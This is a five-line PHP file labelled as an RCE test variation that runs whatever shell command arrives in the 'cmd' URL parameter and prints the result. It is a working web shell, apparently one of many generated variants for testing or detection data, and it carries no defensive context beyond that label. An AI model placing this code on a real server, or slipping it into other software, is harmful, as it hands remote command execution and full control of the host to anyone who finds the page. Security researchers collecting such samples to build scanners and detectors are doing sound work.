<?php
// RCE test variation #1329
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>